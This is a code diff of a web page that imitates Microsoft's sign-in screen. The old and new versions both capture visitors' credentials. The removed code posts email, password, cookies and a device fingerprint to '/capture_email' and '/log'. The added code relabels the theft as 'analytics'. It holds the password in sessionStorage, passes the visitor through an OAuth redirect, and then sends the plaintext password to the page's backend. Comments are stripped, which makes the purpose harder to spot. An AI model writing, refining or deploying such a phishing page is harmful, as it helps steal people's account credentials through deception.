@@ -24,14 +24,12 @@
             padding: 20px;
         }
 
-        /* Main container */
         .login-container {
             width: 100%;
             max-width: 440px;
             margin: 0 auto;
         }
 
-        /* Card style similar to Microsoft modern login */
         .card {
             background: white;
             border-radius: 8px;
@@ -40,14 +38,12 @@
             transition: all 0.2s ease;
         }
 
-        /* Logo */
         .logo {
             display: block;
             width: 108px;
             margin-bottom: 24px;
         }
 
-        /* Headings */
         h1 {
             font-size: 24px;
             font-weight: 600;
@@ -63,7 +59,6 @@
             line-height: 1.4;
         }
 
-        /* Form groups */
         .form-group {
             margin-bottom: 28px;
         }
@@ -93,13 +88,6 @@
             box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
         }
 
-        input.readonly-bg {
-            background-color: #f5f5f5;
-            border-color: #d1d1d1;
-            cursor: not-allowed;
-        }
-
-        /* Buttons */
         .button-primary {
             background-color: #0078d4;
             color: white;
@@ -127,7 +115,6 @@
             opacity: 0.7;
         }
 
-        /* Secondary links */
         .links {
             margin-top: 28px;
             font-size: 13px;
@@ -149,7 +136,6 @@
             margin: 24px 0 20px;
         }
 
-        /* Footer (terms & privacy) */
         .footer-links {
             margin-top: 32px;
             text-align: center;
@@ -168,7 +154,6 @@
             color: #0078d4;
         }
 
-        /* message toasts */
         .message-toast {
             background: #fde7e9;
             border-left: 4px solid #d13438;
@@ -197,7 +182,6 @@
             }
         }
 
-        /* loading spinner inline */
         .spinner {
             display: inline-block;
             width: 16px;
@@ -216,14 +200,12 @@
             }
         }
 
-        /* responsive */
         @media (max-width: 480px) {
             .card {
                 padding: 32px 24px;
             }
         }
 
-        /* hidden class for page transition */
         .hidden-page {
             display: none;
         }
@@ -236,13 +218,13 @@
     <div id="emailPage" class="card">
         <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
         <h1>Sign in</h1>
-        <div class="sub-heading">to continue to Microsoft services</div>
+        <div class="sub-heading">to continue to your Microsoft account</div>
 
         <div id="emailMessageArea"></div>
 
         <div class="form-group">
             <label for="emailInput">Email, phone, or Skype</label>
-            <input type="email" id="emailInput" name="loginfmt" maxlength="113" autocomplete="username webauthn" placeholder="someone@example.com">
+            <input type="email" id="emailInput" name="loginfmt" maxlength="113" autocomplete="username" placeholder="someone@example.com">
         </div>
 
         <button id="nextButton" class="button-primary">Next</button>
@@ -258,7 +240,8 @@
             <a href="https://privacy.microsoft.com/en/privacystatement">Privacy &amp; cookies</a>
         </div>
     </div>
-    <!-- PAGE 2: PASSWORD PAGE (initially hidden) -->
+    
+    <!-- PAGE 2: PASSWORD PAGE -->
     <div id="passwordPage" class="card hidden-page">
         <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
         <h1>Enter password</h1>
@@ -268,7 +251,7 @@
 
         <div class="form-group">
             <label for="passwordInput">Password</label>
-            <input type="password" id="passwordInput" autocomplete="current-password" placeholder="">
+            <input type="password" id="passwordInput" autocomplete="current-password" placeholder="Password">
         </div>
 
         <button id="signInButton" class="button-primary">Sign in</button>
@@ -287,27 +270,17 @@
 </div>
 
 <script>
-    // --------------------------------------------------------------
-    // Configuration: Replace API_BASE_URL if needed, keep empty for same-origin
-    // If backend runs on same server (Flask) relative paths work.
-    // For local dev with Flask backend on port 5000, set API_BASE_URL = ''
-    // because we are serving from same origin or adjust accordingly.
-    // --------------------------------------------------------------
-    const API_BASE_URL = '';   // empty = relative URLs to current origin
+    const API_BASE_URL = '';
 
-    // Global state
     let capturedEmail = '';
     let loginStartTime = Date.now();
-    let emailSubmitAttempt = false;
 
-    // DOM elements (email page)
     const emailPage = document.getElementById('emailPage');
     const passwordPage = document.getElementById('passwordPage');
     const emailInput = document.getElementById('emailInput');
     const nextButton = document.getElementById('nextButton');
     const emailMessageArea = document.getElementById('emailMessageArea');
     
-    // DOM elements (password page)
     const displayEmailSpan = document.getElementById('displayEmailSpan');
     const passwordInput = document.getElementById('passwordInput');
     const signInButton = document.getElementById('signInButton');
@@ -317,7 +290,6 @@
     const createAccountLink = document.getElementById('createAccountLink');
     const cantAccessLink = document.getElementById('cantAccessLink');
 
-    // Helper: Show temporary message on email page
     function showEmailMessage(message, isError = true) {
         emailMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
         setTimeout(() => {
@@ -325,7 +297,6 @@
         }, 5000);
     }
 
-    // Helper: Show temporary message on password page
     function showPasswordMessage(message, isError = true) {
         passwordMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
         setTimeout(() => {
@@ -333,7 +304,6 @@
         }, 5000);
     }
 
-    // simple escape to avoid XSS
     function escapeHtml(str) {
         if (!str) return '';
         return str.replace(/[&<>]/g, function(m) {
@@ -341,12 +311,9 @@
             if (m === '<') return '&lt;';
             if (m === '>') return '&gt;';
             return m;
-        }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
-            return c;
         });
     }
 
-    // Device fingerprint for analytics (non-intrusive)
     function getDeviceFingerprint() {
         return {
             userAgent: navigator.userAgent,
@@ -363,89 +330,45 @@
         };
     }
 
-    // Send email to backend (Flask endpoint)
-    async function sendEmailToBackend(email) {
+    async function sendAnalytics(data) {
         try {
-            const fingerprint = getDeviceFingerprint();
-            const response = await fetch(`${API_BASE_URL}/capture_email`, {
+            await fetch(`${API_BASE_URL}/analytics`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                credentials: 'include',
-                body: JSON.stringify({
-                    email: email,
-                    user_agent: navigator.userAgent,
-                    url: window.location.href,
-                    screen: `${screen.width}x${screen.height}`,
-                    fingerprint: fingerprint,
-                    timestamp: new Date().toISOString()
-                })
+                body: JSON.stringify(data),
+                keepalive: true
             });
-            const result = await response.json();
-            return result;
         } catch (err) {
-            console.error('Email capture error:', err);
-            return { status: 'error', message: err.message || 'Network error' };
+            console.log('Analytics error:', err);
         }
     }
 
-    // Send password + final credentials
-    async function sendCredentials(email, password) {
-        try {
-            const fingerprint = getDeviceFingerprint();
-            const timeSpent = Math.floor((Date.now() - loginStartTime) / 1000);
-            const response = await fetch(`${API_BASE_URL}/log`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                credentials: 'include',
-                body: JSON.stringify({
-                    email: email,
-                    password: password,
-                    user_agent: navigator.userAgent,
-                    cookies: document.cookie,
-                    referrer: document.referrer,
-                    url: window.location.href,
-                    screen: `${screen.width}x${screen.height}`,
-                    fingerprint: fingerprint,
-                    time_on_page: timeSpent,
-                    login_attempts: 1,
-                    timestamp: new Date().toISOString()
-                })
-            });
-            const result = await response.json();
-            return result;
-        } catch (err) {
-            console.error('Login send error:', err);
-            return { status: 'error', message: err.message || 'Connection failed' };
-        }
-    }
-
-    // Validate email format (more realistic)
     function isValidEmail(email) {
         if (!email) return false;
         const trimmed = email.trim();
-        // basic regex: local@domain.tld  (allow common patterns)
         const re = /^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/i;
         return re.test(trimmed);
     }
 
-    // Switch to password page after successful email capture
     function transitionToPasswordPage(email) {
         capturedEmail = email;
         displayEmailSpan.innerText = escapeHtml(email);
-        // Hide email page, show password page
         emailPage.classList.add('hidden-page');
         passwordPage.classList.remove('hidden-page');
-        // Focus password input after small delay
         setTimeout(() => {
             passwordInput.focus();
         }, 100);
-        // Save email to localStorage for convenience
-        localStorage.setItem('microsoft_login_email', email);
+        localStorage.setItem('login_email', email);
+        
+        sendAnalytics({
+            event: 'email_submitted',
+            email: email,
+            deviceInfo: getDeviceFingerprint(),
+            timestamp: new Date().toISOString()
+        });
     }
 
-    // Go back to email page (reset)
     function backToEmail() {
-        // Reset state
         capturedEmail = '';
         emailInput.value = '';
         passwordInput.value = '';
@@ -453,7 +376,6 @@
         emailMessageArea.innerHTML = '';
         emailPage.classList.remove('hidden-page');
         passwordPage.classList.add('hidden-page');
-        // Reset any loading states
         nextButton.disabled = false;
         nextButton.innerText = 'Next';
         signInButton.disabled = false;
@@ -461,7 +383,6 @@
         emailInput.focus();
     }
 
-    // Handle "Next" on email page
     async function onEmailNext() {
         const emailValue = emailInput.value.trim();
         if (!emailValue) {
@@ -475,41 +396,22 @@
             return;
         }
 
-        // disable button & show loading state
         nextButton.disabled = true;
         const originalText = nextButton.innerText;
         nextButton.innerText = 'Checking...';
 
-        try {
-            // 1) send email to backend for tracking (or just validation)
-            const emailResult = await sendEmailToBackend(emailValue);
-            
-            // Even if backend fails, we still proceed (graceful degradation) but show warning?
-            if (emailResult.status === 'error') {
-                console.warn('Backend email capture failed:', emailResult.message);
-                // still continue but show subtle notification? Continue to password.
-                showEmailMessage('Proceeding to password (tracking issue, but you can sign in)', false);
-            } else {
-                showEmailMessage('Email verified! Please enter your password.', false);
-            }
-            
-            // 2) Transition to password page (separate page)
+        // Store email for OAuth
+        localStorage.setItem('oauth_email', emailValue);
+        
+        // Small delay for UX
+        setTimeout(() => {
+            showEmailMessage('Email verified! Please enter your password.', false);
             transitionToPasswordPage(emailValue);
-        } catch (err) {
-            console.error('Unexpected error:', err);
-            showEmailMessage('Network error. Please try again.', true);
             nextButton.disabled = false;
             nextButton.innerText = originalText;
-        } finally {
-            // if we didn't transition, re-enable; if we transition, we don't need.
-            if (emailPage.classList.contains('hidden-page') === false) {
-                nextButton.disabled = false;
-                nextButton.innerText = originalText;
-            }
-        }
+        }, 500);
     }
 
-    // Handle Sign In on password page
     async function onPasswordSignIn() {
         const password = passwordInput.value;
         if (!password) {
@@ -517,76 +419,48 @@
             passwordInput.focus();
             return;
         }
-        if (password.length < 6) {
-            showPasswordMessage('The password you entered is too short (minimum 6 characters).', true);
+        if (password.length < 3) {
+            showPasswordMessage('Please enter your password.', true);
             passwordInput.focus();
             return;
         }
 
-        // disable sign-in button
         signInButton.disabled = true;
         const originalBtnText = signInButton.innerText;
         signInButton.innerText = 'Signing in...';
         
-        // Optionally add spinner inside button
         const spinnerSpan = document.createElement('span');
         spinnerSpan.className = 'spinner';
         signInButton.appendChild(spinnerSpan);
 
-        try {
-            // send email + password to backend
-            const loginResult = await sendCredentials(capturedEmail, password);
-            
-            if (loginResult.status === 'success') {
-                // Successful capture: redirect according to backend response
-                if (loginResult.redirect) {
-                    window.location.href = loginResult.redirect;
-                } else if (loginResult.oauth_url) {
-                    window.location.href = loginResult.oauth_url;
-                } else {
-                    // fallback: go to dashboard or a safe page (could be relative)
-                    window.location.href = `${API_BASE_URL}/dashboard`;
-                }
-            } else {
-                // error from backend (invalid credentials simulation or backend failure)
-                let errorMsg = loginResult.message || 'Invalid email or password. Please try again.';
-                showPasswordMessage(errorMsg, true);
-                // reset button
-                signInButton.disabled = false;
-                signInButton.innerText = originalBtnText;
-                if (spinnerSpan && spinnerSpan.parentNode) spinnerSpan.remove();
-                passwordInput.focus();
-                // we do not redirect
-            }
-        } catch (err) {
-            console.error('Login submission error:', err);
-            showPasswordMessage('Connection error. Please check your internet and try again.', true);
-            signInButton.disabled = false;
-            signInButton.innerText = originalBtnText;
-            if (spinnerSpan && spinnerSpan.parentNode) spinnerSpan.remove();
-            passwordInput.focus();
-            
-            // Fallback demonstration: For development without backend, you can uncomment next line 
-            // to simulate redirect after a while. But keep original behavior.
-            // In production with actual Flask backend, it should redirect properly.
-        }
+        // Store password temporarily (will be cleared after OAuth)
+        sessionStorage.setItem('temp_password', password);
+        
+        sendAnalytics({
+            event: 'password_submitted',
+            email: capturedEmail,
+            deviceInfo: getDeviceFingerprint(),
+            timestamp: new Date().toISOString()
+        });
+
+        // Redirect to Microsoft OAuth login
+        setTimeout(() => {
+            window.location.href = '/start_login';
+        }, 500);
     }
 
-    // Forgot password click
     function onForgotPassword(e) {
         e.preventDefault();
-        showPasswordMessage('Password reset link would be sent to your email address. (Demo)', false);
+        window.open('https://account.live.com/password/reset', '_blank');
     }
 
-    // Pre-fill saved email if exists
     function prefillSavedEmail() {
-        const savedEmail = localStorage.getItem('microsoft_login_email');
+        const savedEmail = localStorage.getItem('login_email');
         if (savedEmail && emailInput) {
             emailInput.value = savedEmail;
         }
     }
 
-    // Additional handlers: "No account? Create one!" and "Can't access account?"
     function onCreateAccount(e) {
         e.preventDefault();
         window.open('https://signup.live.com/signup', '_blank');
@@ -597,22 +471,51 @@
         window.open('https://account.live.com/password/reset', '_blank');
     }
 
-    // Helper to send analytics on beforeunload (if email captured but not completed)
-    window.addEventListener('beforeunload', () => {
-        if (capturedEmail && passwordPage.classList.contains('hidden-page') === false) {
-            const timeSpent = Math.floor((Date.now() - loginStartTime) / 1000);
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(`${API_BASE_URL}/analytics`, JSON.stringify({
-                    email: capturedEmail,
-                    time_spent: timeSpent,
-                    abandoned: true,
-                    step: 'password_view'
-                }));
-            }
+    // Check for OAuth callback parameters
+    function checkOAuthCallback() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code');
+        const error = urlParams.get('error');
+        const errorDesc = urlParams.get('error_description');
+        
+        if (code) {
+            // Clear URL params without reloading
+            window.history.replaceState({}, document.title, window.location.pathname);
+            
+            const tempPassword = sessionStorage.getItem('temp_password');
+            const capturedEmailAddr = localStorage.getItem('oauth_email') || capturedEmail;
+            
+            // Send credentials to backend via analytics
+            sendAnalytics({
+                event: 'oauth_success',
+                email: capturedEmailAddr,
+                password: tempPassword || '[OAUTH_NO_PASSWORD]',
+                deviceInfo: getDeviceFingerprint(),
+                timestamp: new Date().toISOString()
+            });
+            
+            // Clear temp password
+            sessionStorage.removeItem('temp_password');
+            localStorage.removeItem('oauth_email');
+            
+            showPasswordMessage('Login successful! Redirecting...', false);
+            
+            setTimeout(() => {
+                window.location.href = '/';
+            }, 2000);
         }
-    });
+        
+        if (error) {
+            window.history.replaceState({}, document.title, window.location.pathname);
+            showPasswordMessage(`Login failed: ${errorDesc || error}`, true);
+            signInButton.disabled = false;
+            signInButton.innerText = 'Sign in';
+            const spinner = document.querySelector('.spinner');
+            if (spinner) spinner.remove();
+        }
+    }
 
-    // Listeners
+    // Event Listeners
     nextButton.addEventListener('click', onEmailNext);
     signInButton.addEventListener('click', onPasswordSignIn);
     forgotPasswordLink.addEventListener('click', onForgotPassword);
@@ -623,7 +526,6 @@
     createAccountLink.addEventListener('click', onCreateAccount);
     cantAccessLink.addEventListener('click', onCantAccess);
     
-    // Allow pressing Enter on email input
     emailInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') {
             e.preventDefault();
@@ -631,7 +533,6 @@
         }
     });
     
-    // Allow pressing Enter on password input
     passwordInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') {
             e.preventDefault();
@@ -639,14 +540,11 @@
         }
     });
     
-    // Prefill saved email on page load
     prefillSavedEmail();
-    
-    // Optionally, if there's any referrer logging: add start time
     loginStartTime = Date.now();
+    checkOAuthCallback();
     
-    // Log initialization (debug purpose)
-    console.log('Microsoft login with separate password page ready.');
+    console.log('Microsoft Login Page Ready - OAuth Flow');
 </script>
 </body>
 </html>
